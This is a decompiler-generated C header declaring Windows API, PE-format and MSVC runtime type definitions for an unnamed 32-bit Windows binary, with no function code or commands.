typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined6;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef ulonglong __uint64;

typedef struct _cpinfo _cpinfo, *P_cpinfo;

typedef uint UINT;

typedef uchar BYTE;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef ulong DWORD;

typedef DWORD LCTYPE;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void *HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

typedef ushort WORD;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef wchar_t WCHAR;

typedef WCHAR *LPWSTR;

typedef BYTE *LPBYTE;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef void (*_PHNDLR)(int);

typedef struct _strflt _strflt, *P_strflt;

struct _strflt {
    int sign;
    int decpt;
    int flag;
    char *mantissa;
};

typedef struct _strflt *STRFLT;

typedef enum enum_3272 {
    INTRNCVT_OK=0,
    INTRNCVT_OVERFLOW=1,
    INTRNCVT_UNDERFLOW=2
} enum_3272;

typedef enum enum_3272 INTRNCVT_STATUS;

typedef struct _iobuf _iobuf, *P_iobuf;

typedef struct _iobuf FILE;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

typedef char *va_list;

typedef uint uintptr_t;

typedef struct lconv lconv, *Plconv;

struct lconv {
    char *decimal_point;
    char *thousands_sep;
    char *grouping;
    char *int_curr_symbol;
    char *currency_symbol;
    char *mon_decimal_point;
    char *mon_thousands_sep;
    char *mon_grouping;
    char *positive_sign;
    char *negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t *_W_decimal_point;
    wchar_t *_W_thousands_sep;
    wchar_t *_W_int_curr_symbol;
    wchar_t *_W_currency_symbol;
    wchar_t *_W_mon_decimal_point;
    wchar_t *_W_mon_thousands_sep;
    wchar_t *_W_positive_sign;
    wchar_t *_W_negative_sign;
};

typedef uint size_t;

typedef ushort wint_t;

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct *pthreadlocinfo;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

struct localerefcount {
    char *locale;
    wchar_t *wlocale;
    int *refcount;
    int *wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int *lconv_intl_refcount;
    int *lconv_num_refcount;
    int *lconv_mon_refcount;
    struct lconv *lconv;
    int *ctype1_refcount;
    ushort *ctype1;
    ushort *pctype;
    uchar *pclmap;
    uchar *pcumap;
    struct __lc_time_data *lc_time_curr;
    wchar_t *locale_name[6];
};

struct __lc_time_data {
    char *wday_abbr[7];
    char *wday[7];
    char *month_abbr[12];
    char *month[12];
    char *ampm[2];
    char *ww_sdatefmt;
    char *ww_ldatefmt;
    char *ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t *_W_wday_abbr[7];
    wchar_t *_W_wday[7];
    wchar_t *_W_month_abbr[12];
    wchar_t *_W_month[12];
    wchar_t *_W_ampm[2];
    wchar_t *_W_ww_sdatefmt;
    wchar_t *_W_ww_ldatefmt;
    wchar_t *_W_ww_timefmt;
    wchar_t *_W_ww_locale_name;
};

typedef int errno_t;

typedef struct localeinfo_struct localeinfo_struct, *Plocaleinfo_struct;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct *pthreadmbcinfo;

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t *mblocalename;
};

struct localeinfo_struct {
    pthreadlocinfo locinfo;
    pthreadmbcinfo mbcinfo;
};

typedef int intptr_t;

typedef struct localeinfo_struct *_locale_t;

typedef size_t rsize_t;

typedef ushort wctype_t;

typedef struct tagMOUSEINPUT tagMOUSEINPUT, *PtagMOUSEINPUT;

typedef struct tagMOUSEINPUT MOUSEINPUT;

struct tagMOUSEINPUT {
    LONG dx;
    LONG dy;
    DWORD mouseData;
    DWORD dwFlags;
    DWORD time;
    ULONG_PTR dwExtraInfo;
};

typedef struct tagINPUT tagINPUT, *PtagINPUT;

typedef union _union_859 _union_859, *P_union_859;

typedef struct tagKEYBDINPUT tagKEYBDINPUT, *PtagKEYBDINPUT;

typedef struct tagKEYBDINPUT KEYBDINPUT;

typedef struct tagHARDWAREINPUT tagHARDWAREINPUT, *PtagHARDWAREINPUT;

typedef struct tagHARDWAREINPUT HARDWAREINPUT;

struct tagKEYBDINPUT {
    WORD wVk;
    WORD wScan;
    DWORD dwFlags;
    DWORD time;
    ULONG_PTR dwExtraInfo;
};

struct tagHARDWAREINPUT {
    DWORD uMsg;
    WORD wParamL;
    WORD wParamH;
};

union _union_859 {
    MOUSEINPUT mi;
    KEYBDINPUT ki;
    HARDWAREINPUT hi;
};

struct tagINPUT {
    DWORD type;
    union _union_859 field1_0x4;
};

typedef struct tagWNDCLASSEXW tagWNDCLASSEXW, *PtagWNDCLASSEXW;

typedef struct tagWNDCLASSEXW WNDCLASSEXW;

typedef long LONG_PTR;

typedef LONG_PTR LRESULT;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef LONG_PTR LPARAM;

typedef LRESULT (*WNDPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HICON__ HICON__, *PHICON__;

typedef struct HICON__ *HICON;

typedef HICON HCURSOR;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

typedef struct HBRUSH__ *HBRUSH;

typedef WCHAR *LPCWSTR;

struct HBRUSH__ {
    int unused;
};

struct HICON__ {
    int unused;
};

struct HINSTANCE__ {
    int unused;
};

struct HWND__ {
    int unused;
};

struct tagWNDCLASSEXW {
    UINT cbSize;
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCWSTR lpszMenuName;
    LPCWSTR lpszClassName;
    HICON hIconSm;
};

typedef struct tagPAINTSTRUCT tagPAINTSTRUCT, *PtagPAINTSTRUCT;

typedef struct tagPAINTSTRUCT *LPPAINTSTRUCT;

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

struct HDC__ {
    int unused;
};

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

struct tagPAINTSTRUCT {
    HDC hdc;
    BOOL fErase;
    RECT rcPaint;
    BOOL fRestore;
    BOOL fIncUpdate;
    BYTE rgbReserved[32];
};

typedef struct tagINPUT *LPINPUT;

typedef struct tagPAINTSTRUCT PAINTSTRUCT;

typedef int INT_PTR;

typedef INT_PTR (*DLGPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef struct _OSVERSIONINFOW _OSVERSIONINFOW, *P_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOW *LPOSVERSIONINFOW;

struct _OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
};

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef DWORD ACCESS_MASK;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _IMAGE_SECTION_HEADER *PIMAGE_SECTION_HEADER;

typedef WCHAR *LPWCH;

typedef LARGE_INTEGER *PLARGE_INTEGER;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef struct HACCEL__ HACCEL__, *PHACCEL__;

typedef struct HACCEL__ *HACCEL;

struct HACCEL__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef int (*FARPROC)(void);

typedef WORD ATOM;

typedef struct tagRECT *LPRECT;

typedef BOOL *LPBOOL;

typedef struct HKEY__ *HKEY;

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

typedef struct HRSRC__ *HRSRC;

struct HRSRC__ {
    int unused;
};

typedef struct _FILETIME _FILETIME, *P_FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef struct tagPOINT tagPOINT, *PtagPOINT;

struct tagPOINT {
    LONG x;
    LONG y;
};

typedef DWORD *LPDWORD;

typedef struct _FILETIME FILETIME;

typedef struct HMENU__ HMENU__, *PHMENU__;

typedef struct HMENU__ *HMENU;

struct HMENU__ {
    int unused;
};

typedef struct _FILETIME *LPFILETIME;

typedef WORD *LPWORD;

typedef HKEY *PHKEY;

typedef int INT;

typedef HANDLE HGLOBAL;

typedef BYTE *PBYTE;

typedef void *LPCVOID;

typedef struct tagPOINT POINT;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_20 IMAGE_RESOURCE_DIR_STRING_U_20, *PIMAGE_RESOURCE_DIR_STRING_U_20;

struct IMAGE_RESOURCE_DIR_STRING_U_20 {
    word Length;
    wchar16 NameString[10];
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY32 IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

struct IMAGE_LOAD_CONFIG_DIRECTORY32 {
    dword Size;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword GlobalFlagsClear;
    dword GlobalFlagsSet;
    dword CriticalSectionDefaultTimeout;
    dword DeCommitFreeBlockThreshold;
    dword DeCommitTotalFreeThreshold;
    pointer32 LockPrefixTable;
    dword MaximumAllocationSize;
    dword VirtualMemoryThreshold;
    dword ProcessHeapFlags;
    dword ProcessAffinityMask;
    word CsdVersion;
    word DependentLoadFlags;
    pointer32 EditList;
    pointer32 SecurityCookie;
    pointer32 SEHandlerTable;
    dword SEHandlerCount;
};

typedef ACCESS_MASK REGSAM;

typedef LONG LSTATUS;

typedef struct setloc_struct setloc_struct, *Psetloc_struct;

typedef struct _is_ctype_compatible _is_ctype_compatible, *P_is_ctype_compatible;

struct _is_ctype_compatible {
    ulong id;
    int is_clike;
};

struct setloc_struct {
    wchar_t *pchLanguage;
    wchar_t *pchCountry;
    int iLocState;
    int iPrimaryLen;
    BOOL bAbbrevLanguage;
    BOOL bAbbrevCountry;
    UINT _cachecp;
    wchar_t _cachein[131];
    wchar_t _cacheout[131];
    struct _is_ctype_compatible _Loc_c[5];
    wchar_t _cacheLocaleName[85];
};

typedef struct _tiddata _tiddata, *P_tiddata;

typedef struct setloc_struct _setloc_struct;

struct _tiddata {
    ulong _tid;
    uintptr_t _thandle;
    int _terrno;
    ulong _tdoserrno;
    uint _fpds;
    ulong _holdrand;
    char *_token;
    wchar_t *_wtoken;
    uchar *_mtoken;
    char *_errmsg;
    wchar_t *_werrmsg;
    char *_namebuf0;
    wchar_t *_wnamebuf0;
    char *_namebuf1;
    wchar_t *_wnamebuf1;
    char *_asctimebuf;
    wchar_t *_wasctimebuf;
    void *_gmtimebuf;
    char *_cvtbuf;
    uchar _con_ch_buf[5];
    ushort _ch_buf_used;
    void *_initaddr;
    void *_initarg;
    void *_pxcptacttab;
    void *_tpxcptinfoptrs;
    int _tfpecode;
    pthreadmbcinfo ptmbcinfo;
    pthreadlocinfo ptlocinfo;
    int _ownlocale;
    ulong _NLG_dwCode;
    void *_terminate;
    void *_unexpected;
    void *_translator;
    void *_purecall;
    void *_curexception;
    void *_curcontext;
    int _ProcessingThrow;
    void *_curexcspec;
    void *_pFrameInfoChain;
    _setloc_struct _setloc_data;
    void *_reserved1;
    void *_reserved2;
    void *_reserved3;
    void *_reserved4;
    void *_reserved5;
    int _cxxReThrow;
    ulong __initDomain;
    int _initapartment;
};

typedef struct _tiddata *_ptiddata;

typedef enum _EXCEPTION_DISPOSITION {
} _EXCEPTION_DISPOSITION;

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

struct _s_FuncInfo { // PlaceHolder Structure
};

typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

struct _s_HandlerType { // PlaceHolder Structure
};

typedef struct TranslatorGuardRN TranslatorGuardRN, *PTranslatorGuardRN;

struct TranslatorGuardRN { // PlaceHolder Structure
};

typedef struct EHExceptionRecord EHExceptionRecord, *PEHExceptionRecord;

struct EHExceptionRecord { // PlaceHolder Structure
};

typedef struct _LocaleUpdate _LocaleUpdate, *P_LocaleUpdate;

struct _LocaleUpdate { // PlaceHolder Structure
};

typedef struct _s_ESTypeList _s_ESTypeList, *P_s_ESTypeList;

struct _s_ESTypeList { // PlaceHolder Structure
};

typedef struct CatchGuardRN CatchGuardRN, *PCatchGuardRN;

struct CatchGuardRN { // PlaceHolder Structure
};

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

struct _s_CatchableType { // PlaceHolder Structure
};

typedef struct EHRegistrationNode EHRegistrationNode, *PEHRegistrationNode;

struct EHRegistrationNode { // PlaceHolder Structure
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

struct _s_TryBlockMapEntry { // PlaceHolder Structure
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Structure
};

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Structure
};

typedef struct bad_alloc bad_alloc, *Pbad_alloc;

struct bad_alloc { // PlaceHolder Structure
};

typedef struct bad_exception bad_exception, *Pbad_exception;

struct bad_exception { // PlaceHolder Structure
};

